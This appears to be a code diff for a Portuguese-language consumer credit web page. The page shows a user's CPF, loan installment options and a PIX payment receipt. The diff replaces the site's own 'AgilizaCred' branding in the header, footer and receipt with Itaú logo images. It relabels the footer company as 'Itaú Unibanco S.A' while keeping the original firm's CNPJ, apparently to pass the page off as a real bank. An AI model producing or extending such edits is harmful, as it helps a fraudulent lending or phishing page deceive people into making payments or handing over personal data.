@@ -50,10 +50,40 @@
     }
     .menu-icon:hover { background: #E5E7EB; transform: scale(1.05); }
     .menu-icon svg { width: 18px; height: 18px; color: #374151; stroke-width: 2.5; }
+
     .logo { display: flex; align-items: center; user-select: none; }
     .logo-cred { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
     .logo-diamond { width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
     .logo-on { font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#22C55E; letter-spacing:-0.5px; line-height:1; }
+
+    /* ✅ NOVO: logo como imagem (header/rodapé/recibo) */
+    .brand-logo{
+      display:flex;
+      align-items:center;
+      user-select:none;
+      text-decoration:none;
+      line-height:0;
+    }
+    .brand-logo img{
+      display:block;
+      height: 26px; /* ajuste se quiser */
+      width: auto;
+      max-width: 190px;
+      object-fit: contain;
+    }
+    .footer-logo-img img{
+      height: 20px; /* ajuste se quiser */
+      max-width: 180px;
+      opacity: 0.95;
+    }
+    .receipt-logo-img img{
+      height: 22px; /* ajuste se quiser */
+      max-width: 200px;
+      object-fit: contain;
+      display:block;
+      margin: 0 auto;
+    }
+
     .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
     .user-name { font-size: 13px; font-weight: 600; color: #111827; max-width: 120px; }
     .user-cpf { font-size: 11px; color: #6B7280; letter-spacing: 0.3px; }
@@ -436,7 +466,7 @@
     footer small strong { color: #16A34A; }
 
     .input-container.hidden { display: none; }
-      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
     .logo-row { display:flex; align-items:center; }
     .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
     .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
@@ -451,7 +481,19 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
           </svg>
         </div>
-        <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+
+        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+        <a class="brand-logo" href="#" aria-label="Itaú / AgilizaCred">
+          <img src="/images/itau2.png" alt="Itaú">
+        </a>
+
+        <!-- (se quiser manter a logo antiga também, descomente) -->
+        <!--
+        <div class="logo-wrap">
+          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
+          <span class="logo-tagline">Crédito Fácil</span>
+        </div>
+        -->
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -508,10 +550,13 @@
 
   <footer class="site-footer">
     <div class="footer-inner">
-      <div class="footer-logo">
-        <span class="f-logo-cred">Agiliza</span><span class="f-logo-on">Cred</span>
-      </div>
-      <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
+
+      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú / AgilizaCred">
+        <img src="/images/itau2.png" alt="Itaú">
+      </a>
+
+      <small><strong>Itaú Unibanco S.A</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
     </div>
   </footer>
 
@@ -819,7 +864,6 @@
         card.className = 'installment-card';
         card.onclick = () => selectInstallment(op.months, op.monthly, op.total);
         
-        // Destacar opção mais popular (24 meses)
         const isPopular = op.months === 24;
         if (isPopular) {
           card.style.border = '2px solid var(--green-accent)';
@@ -868,7 +912,12 @@
       r.innerHTML = `
         <div class="pix-receipt">
           <div class="receipt-header">
-            <div style="margin:0 auto 12px;text-align:center"><span class="receipt-logo-text">Agiliza</span><span class="receipt-logo-on">Cred</span></div>
+
+            <!-- ✅ LOGO EM IMAGEM NO RECIBO -->
+            <div class="receipt-logo-img" style="margin:0 auto 12px;text-align:center">
+              <img src="/images/logo.png" alt="Itaú">
+            </div>
+
             <div class="receipt-title">Comprovante PIX</div>
             <span class="receipt-status"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Concluído</span>
           </div>
